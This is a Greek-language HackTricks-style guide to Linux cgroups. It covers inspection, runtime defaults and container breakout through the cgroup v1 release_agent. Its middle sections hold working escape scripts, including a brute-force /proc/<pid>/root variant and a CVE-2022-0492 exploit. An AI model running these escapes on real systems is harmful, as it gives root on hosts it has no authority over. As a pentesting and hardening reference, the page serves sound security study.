# cgroups

{{#include ../../../../banners/hacktricks-training.md}}

## Επισκόπηση

Τα Linux **control groups** είναι ο μηχανισμός του kernel που χρησιμοποιείται για την ομαδοποίηση processes με σκοπό τη λογιστική καταγραφή, τον περιορισμό, την ιεράρχηση και την επιβολή πολιτικών. Αν τα namespaces αφορούν κυρίως την απομόνωση της οπτικής των resources, τα cgroups αφορούν κυρίως τον έλεγχο του **πόσους** από αυτούς τους resources μπορεί να καταναλώσει ένα σύνολο processes και, σε ορισμένες περιπτώσεις, **με ποιες κατηγορίες resources** μπορεί να αλληλεπιδράσει. Τα containers βασίζονται συνεχώς στα cgroups, ακόμη και όταν ο χρήστης δεν τα εξετάζει άμεσα, επειδή σχεδόν κάθε σύγχρονο runtime χρειάζεται έναν τρόπο να ενημερώνει τον kernel ότι «αυτά τα processes ανήκουν σε αυτό το workload και αυτοί είναι οι κανόνες resources που εφαρμόζονται σε αυτά».

Γι' αυτό οι container engines τοποθετούν ένα νέο container στο δικό του cgroup subtree. Μόλις το process tree βρίσκεται εκεί, το runtime μπορεί να περιορίσει τη μνήμη, να περιορίσει τον αριθμό των PIDs, να καθορίσει το βάρος χρήσης της CPU, να ρυθμίσει το I/O και να περιορίσει την πρόσβαση σε devices. Σε ένα production περιβάλλον, αυτό είναι απαραίτητο τόσο για την ασφάλεια σε περιβάλλον multi-tenant όσο και για τη βασική operational υγιεινή. Ένα container χωρίς ουσιαστικούς ελέγχους resources μπορεί να εξαντλήσει τη μνήμη, να κατακλύσει το σύστημα με processes ή να μονοπωλήσει τη CPU και το I/O με τρόπους που καθιστούν τον host ή τα γειτονικά workloads ασταθή.

Από άποψη security, τα cgroups είναι σημαντικά με δύο ξεχωριστούς τρόπους. Πρώτον, τα κακά ή ανύπαρκτα resource limits επιτρέπουν απλές επιθέσεις denial-of-service. Δεύτερον, ορισμένα cgroup features, ιδιαίτερα σε παλαιότερες εγκαταστάσεις **cgroup v1**, έχουν ιστορικά δημιουργήσει ισχυρά breakout primitives όταν ήταν writable από το εσωτερικό ενός container.

## v1 έναντι v2

Υπάρχουν δύο κύρια cgroup models σε χρήση. Το **cgroup v1** εκθέτει πολλαπλές controller hierarchies και τα παλαιότερα exploit writeups συχνά βασίζονται στα παράξενα και, μερικές φορές, υπερβολικά ισχυρά semantics που ήταν διαθέσιμα εκεί. Το **cgroup v2** εισάγει μια πιο ενοποιημένη hierarchy και, γενικά, πιο καθαρή συμπεριφορά. Οι σύγχρονες distributions προτιμούν όλο και περισσότερο το cgroup v2, αλλά εξακολουθούν να υπάρχουν mixed ή legacy environments, πράγμα που σημαίνει ότι και τα δύο models παραμένουν σχετικά κατά την αξιολόγηση πραγματικών συστημάτων.

Η διαφορά έχει σημασία, επειδή ορισμένες από τις πιο γνωστές ιστορίες container breakout, όπως οι καταχρήσεις του **`release_agent`** στο cgroup v1, συνδέονται πολύ συγκεκριμένα με παλαιότερη συμπεριφορά των cgroups. Ένας reader που βλέπει ένα cgroup exploit σε ένα blog και στη συνέχεια το εφαρμόζει τυφλά σε ένα σύγχρονο σύστημα που χρησιμοποιεί αποκλειστικά cgroup v2 είναι πιθανό να παρανοήσει τι είναι πραγματικά δυνατό στο target.

## Επιθεώρηση

Ο γρηγορότερος τρόπος για να δεις πού βρίσκεται το τρέχον shell σου είναι ο εξής:
```bash
cat /proc/self/cgroup
findmnt -T /sys/fs/cgroup
```
Το αρχείο `/proc/self/cgroup` εμφανίζει τα cgroup paths που σχετίζονται με την τρέχουσα διεργασία. Σε έναν σύγχρονο cgroup v2 host, συνήθως θα δείτε μια unified entry. Σε παλαιότερους ή hybrid hosts, μπορεί να δείτε πολλαπλά v1 controller paths. Αφού εντοπίσετε το path, μπορείτε να εξετάσετε τα αντίστοιχα αρχεία κάτω από το `/sys/fs/cgroup` για να δείτε τα limits και την τρέχουσα χρήση.

Σε έναν cgroup v2 host, οι παρακάτω εντολές είναι χρήσιμες:
```bash
ls -l /sys/fs/cgroup
cat /sys/fs/cgroup/cgroup.controllers
cat /sys/fs/cgroup/cgroup.subtree_control
```
Αυτά τα αρχεία αποκαλύπτουν ποιοι ελεγκτές υπάρχουν και ποιοι έχουν ανατεθεί σε child cgroups. Αυτό το μοντέλο ανάθεσης είναι σημαντικό σε rootless και systemd-managed περιβάλλοντα, όπου το runtime μπορεί να έχει τη δυνατότητα να ελέγχει μόνο το υποσύνολο της λειτουργικότητας των cgroups που έχει πράγματι αναθέσει η γονική ιεραρχία.

## Εργαστήριο

Ένας τρόπος να παρατηρήσετε τα cgroups στην πράξη είναι να εκτελέσετε ένα container με περιορισμό μνήμης:
```bash
docker run --rm -it --memory=256m debian:stable-slim bash
cat /proc/self/cgroup
cat /sys/fs/cgroup/memory.max 2>/dev/null || cat /sys/fs/cgroup/memory.limit_in_bytes 2>/dev/null
```
Μπορείτε επίσης να δοκιμάσετε ένα container με περιορισμό PID:
```bash
docker run --rm -it --pids-limit=64 debian:stable-slim bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
```
Αυτά τα παραδείγματα είναι χρήσιμα επειδή βοηθούν στη σύνδεση του flag του runtime με το file interface του kernel. Το runtime δεν επιβάλλει τον κανόνα με μαγεία· γράφει τις σχετικές ρυθμίσεις του cgroup και στη συνέχεια αφήνει τον kernel να τις επιβάλει στο process tree.

## Χρήση Runtime

Τα Docker, Podman, containerd και CRI-O βασίζονται όλα στα cgroups ως μέρος της κανονικής λειτουργίας τους. Οι διαφορές συνήθως δεν αφορούν το αν χρησιμοποιούν cgroups, αλλά **ποια defaults επιλέγουν**, **πώς αλληλεπιδρούν με το systemd**, **πώς λειτουργεί η rootless delegation** και **πόσο από τη διαμόρφωση ελέγχεται σε επίπεδο engine έναντι του επιπέδου orchestration**.

Στο Kubernetes, τα resource requests και limits τελικά γίνονται configuration του cgroup στον node. Η διαδρομή από το Pod YAML έως την επιβολή από τον kernel περνά από το kubelet, το CRI runtime και το OCI runtime, αλλά τα cgroups παραμένουν ο μηχανισμός του kernel που τελικά εφαρμόζει τον κανόνα. Σε περιβάλλοντα Incus/LXC, τα cgroups χρησιμοποιούνται επίσης εκτενώς, ειδικά επειδή τα system containers συχνά εκθέτουν πλουσιότερο process tree και λειτουργικές προσδοκίες που μοιάζουν περισσότερο με VM.

## Misconfigurations And Breakouts

Η κλασική ιστορία ασφάλειας των cgroups αφορά τον writable μηχανισμό **cgroup v1 `release_agent`**. Σε αυτό το μοντέλο, αν ένας attacker μπορούσε να γράψει στα σωστά αρχεία του cgroup, να ενεργοποιήσει το `notify_on_release` και να ελέγξει το path που είναι αποθηκευμένο στο `release_agent`, ο kernel θα μπορούσε τελικά να εκτελέσει ένα path που έχει επιλέξει ο attacker στα initial namespaces του host, όταν το cgroup άδειαζε. Γι’ αυτό τα παλαιότερα writeups δίνουν τόση προσοχή στο αν οι cgroup controllers είναι writable, στις mount options και στις συνθήκες namespace/capability.

Ακόμη και όταν το `release_agent` δεν είναι διαθέσιμο, τα λάθη στη διαμόρφωση των cgroups εξακολουθούν να έχουν σημασία. Η υπερβολικά ευρεία πρόσβαση σε devices μπορεί να κάνει host devices προσβάσιμα από το container. Η απουσία memory και PID limits μπορεί να μετατρέψει ένα απλό code execution σε host DoS. Η αδύναμη cgroup delegation σε rootless σενάρια μπορεί επίσης να παραπλανήσει τους defenders, κάνοντάς τους να υποθέσουν ότι υπάρχει ένας περιορισμός, ενώ το runtime δεν είχε ποτέ πραγματικά τη δυνατότητα να τον εφαρμόσει.

### `release_agent` Background

Η τεχνική `release_agent` εφαρμόζεται μόνο σε **cgroup v1**. Η βασική ιδέα είναι ότι όταν τερματίσει η τελευταία process σε ένα cgroup και έχει οριστεί `notify_on_release=1`, ο kernel εκτελεί το πρόγραμμα του οποίου το path είναι αποθηκευμένο στο `release_agent`. Η εκτέλεση αυτή γίνεται στα **initial namespaces του host**, γεγονός που μετατρέπει ένα writable `release_agent` σε primitive για container escape.

Για να λειτουργήσει η τεχνική, ο attacker χρειάζεται γενικά:

- ένα writable hierarchy **cgroup v1**
- τη δυνατότητα δημιουργίας ή χρήσης ενός child cgroup
- τη δυνατότητα ορισμού του `notify_on_release`
- τη δυνατότητα εγγραφής ενός path στο `release_agent`
- ένα path που επιλύεται σε executable από την οπτική γωνία του host

### Classic PoC

Το ιστορικό one-liner PoC είναι:
```bash
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p "$d/w"
echo 1 > "$d/w/notify_on_release"
t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
touch /o
echo "$t/c" > "$d/release_agent"
cat <<'EOF' > /c
#!/bin/sh
ps aux > "$t/o"
EOF
chmod +x /c
sh -c "echo 0 > $d/w/cgroup.procs"
sleep 1
cat /o
```
Αυτό το PoC γράφει μια διαδρομή payload στο `release_agent`, ενεργοποιεί το cgroup release και, στη συνέχεια, διαβάζει το αρχείο εξόδου που δημιουργήθηκε στο host.

### Κατανοητή Παρουσίαση Βήμα προς Βήμα

Η ίδια ιδέα γίνεται πιο εύκολη στην κατανόηση όταν χωρίζεται σε βήματα.

1. Δημιουργήστε και προετοιμάστε ένα writable cgroup:
```bash
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp    # or memory if available in v1
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
```
2. Εντοπίστε τη διαδρομή του host που αντιστοιχεί στο filesystem του container:
```bash
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
3. Τοποθετήστε ένα payload που θα είναι ορατό από το path του host:
```bash
cat <<'EOF' > /cmd
#!/bin/sh
ps aux > /output
EOF
chmod +x /cmd
```
4. Ενεργοποιήστε την εκτέλεση καθιστώντας το cgroup κενό:
```bash
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"
sleep 1
cat /output
```
Το αποτέλεσμα είναι η εκτέλεση του payload στην πλευρά του host με δικαιώματα root του host. Σε ένα πραγματικό exploit, το payload συνήθως γράφει ένα proof file, εκκινεί ένα reverse shell ή τροποποιεί την κατάσταση του host.

### Παραλλαγή σχετικής διαδρομής με χρήση του `/proc/<pid>/root`

Σε ορισμένα περιβάλλοντα, η διαδρομή του host προς το filesystem του container δεν είναι προφανής ή αποκρύπτεται από τον storage driver. Σε αυτή την περίπτωση, η διαδρομή του payload μπορεί να εκφραστεί μέσω του `/proc/<pid>/root/...`, όπου το `<pid>` είναι ένα host PID που ανήκει σε μια διεργασία στο τρέχον container. Σε αυτό βασίζεται η παραλλαγή brute-force με relative path:
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

sleep 10000 &

cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh
OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}
ps -eaf > \${OUTPATH} 2>&1
__EOF__

chmod a+x ${PAYLOAD_PATH}

mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID}"
exit 1
fi
fi
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

sleep 1
cat ${OUTPUT_PATH}
```
Το σχετικό trick εδώ δεν είναι το ίδιο το brute force, αλλά η μορφή του path: το `/proc/<pid>/root/...` επιτρέπει στον kernel να επιλύσει ένα αρχείο μέσα στο filesystem του container από το host namespace, ακόμη και όταν το άμεσο path αποθήκευσης του host δεν είναι γνωστό εκ των προτέρων.

### CVE-2022-0492 Variant

Το 2022, το CVE-2022-0492 έδειξε ότι η εγγραφή στο `release_agent` στο cgroup v1 δεν έλεγχε σωστά το `CAP_SYS_ADMIN` στο **initial** user namespace. Αυτό έκανε την τεχνική πολύ πιο εύκολα προσβάσιμη σε ευάλωτους kernels, επειδή μια διεργασία container που μπορούσε να κάνει mount μια ιεραρχία cgroup μπορούσε να γράψει στο `release_agent` χωρίς να έχει ήδη προνόμια στο host user namespace.

Minimal exploit:
```bash
apk add --no-cache util-linux
unshare -UrCm sh -c '
mkdir /tmp/c
mount -t cgroup -o memory none /tmp/c
echo 1 > /tmp/c/notify_on_release
echo /proc/self/exe > /tmp/c/release_agent
(sleep 1; echo 0 > /tmp/c/cgroup.procs) &
while true; do sleep 1; done
'
```
Σε έναν ευάλωτο kernel, το host εκτελεί το `/proc/self/exe` με προνόμια root του host.

Για πρακτικό abuse, ξεκινήστε ελέγχοντας αν το περιβάλλον εξακολουθεί να εκθέτει εγγράψιμες διαδρομές cgroup-v1 ή επικίνδυνη πρόσβαση σε συσκευές:
```bash
mount | grep cgroup
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null -exec ls -l {} \;
find /sys/fs/cgroup -maxdepth 3 -writable 2>/dev/null | head -n 50
ls -l /dev | head -n 50
```
Αν το `release_agent` υπάρχει και είναι εγγράψιμο, βρίσκεστε ήδη σε territory του legacy-breakout:
```bash
find /sys/fs/cgroup -maxdepth 3 -name notify_on_release 2>/dev/null
find /sys/fs/cgroup -maxdepth 3 -name cgroup.procs 2>/dev/null | head
```
Αν το ίδιο το cgroup path δεν οδηγεί σε escape, η επόμενη πρακτική χρήση είναι συχνά το denial of service ή το reconnaissance:
```bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
cat /sys/fs/cgroup/memory.max 2>/dev/null
cat /sys/fs/cgroup/cpu.max 2>/dev/null
```
Αυτές οι εντολές δείχνουν γρήγορα αν το workload έχει περιθώριο για fork-bomb, επιθετική κατανάλωση μνήμης ή κατάχρηση ενός εγγράψιμου legacy cgroup interface.

## Έλεγχοι

Κατά την αξιολόγηση ενός target, ο σκοπός των ελέγχων cgroup είναι να διαπιστωθεί ποιο cgroup model χρησιμοποιείται, αν το container βλέπει εγγράψιμες διαδρομές controller και αν παλιά breakout primitives, όπως το `release_agent`, είναι καν σχετικά.
```bash
cat /proc/self/cgroup                                      # Current process cgroup placement
mount | grep cgroup                                        # cgroup v1/v2 mounts and mount options
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null   # Legacy v1 breakout primitive
cat /proc/1/cgroup                                         # Compare with PID 1 / host-side process layout
```
Τι είναι ενδιαφέρον εδώ:

- Αν το `mount | grep cgroup` εμφανίζει **cgroup v1**, τα παλαιότερα breakout writeups αποκτούν μεγαλύτερη σημασία.
- Αν υπάρχει το `release_agent` και είναι προσβάσιμο, αυτό αξίζει άμεσα βαθύτερη διερεύνηση.
- Αν η ορατή ιεραρχία cgroup είναι εγγράψιμη και το container διαθέτει επίσης ισχυρά capabilities, το περιβάλλον απαιτεί πολύ προσεκτικότερο έλεγχο.

Αν ανακαλύψετε **cgroup v1**, εγγράψιμα controller mounts και ένα container που διαθέτει επίσης ισχυρά capabilities ή ανεπαρκή προστασία seccomp/AppArmor, αυτός ο συνδυασμός απαιτεί ιδιαίτερη προσοχή. Τα cgroups συχνά αντιμετωπίζονται ως ένα αδιάφορο θέμα διαχείρισης πόρων, όμως ιστορικά έχουν αποτελέσει μέρος μερικών από τις πιο διδακτικές αλυσίδες container escape, ακριβώς επειδή το όριο μεταξύ του «ελέγχου πόρων» και της «επιρροής στον host» δεν ήταν πάντα τόσο σαφές όσο υπέθεταν πολλοί.

## Προεπιλογές Runtime

| Runtime / πλατφόρμα | Προεπιλεγμένη κατάσταση | Προεπιλεγμένη συμπεριφορά | Συνήθης χειροκίνητη αποδυνάμωση |
| --- | --- | --- | --- |
| Docker Engine | Ενεργοποιημένο από προεπιλογή | Τα containers τοποθετούνται αυτόματα σε cgroups· τα όρια πόρων είναι προαιρετικά, εκτός αν οριστούν με flags | παράλειψη των `--memory`, `--pids-limit`, `--cpus`, `--blkio-weight`· `--device`· `--privileged` |
| Podman | Ενεργοποιημένο από προεπιλογή | Το `--cgroups=enabled` είναι η προεπιλογή· οι προεπιλογές του cgroup namespace διαφέρουν ανάλογα με την έκδοση cgroup (`private` στο cgroup v2, `host` σε ορισμένες εγκαταστάσεις cgroup v1) | `--cgroups=disabled`, `--cgroupns=host`, χαλαρότερη πρόσβαση σε devices, `--privileged` |
| Kubernetes | Ενεργοποιημένο μέσω του runtime από προεπιλογή | Τα Pods και τα containers τοποθετούνται σε cgroups από το runtime του node· ο λεπτομερής έλεγχος πόρων εξαρτάται από τα `resources.requests` / `resources.limits` | παράλειψη των resource requests/limits, privileged πρόσβαση σε devices, εσφαλμένη ρύθμιση του runtime σε επίπεδο host |
| containerd / CRI-O | Ενεργοποιημένο από προεπιλογή | Τα cgroups αποτελούν μέρος της κανονικής διαχείρισης του lifecycle | άμεσες ρυθμίσεις του runtime που χαλαρώνουν τους ελέγχους συσκευών ή εκθέτουν παλαιές εγγράψιμες διεπαφές cgroup v1 |

Η σημαντική διάκριση είναι ότι η **ύπαρξη cgroup** είναι συνήθως προεπιλεγμένη, ενώ οι **χρήσιμοι περιορισμοί πόρων** είναι συχνά προαιρετικοί, εκτός αν ρυθμιστούν ρητά.
{{#include ../../../../banners/hacktricks-training.md}}
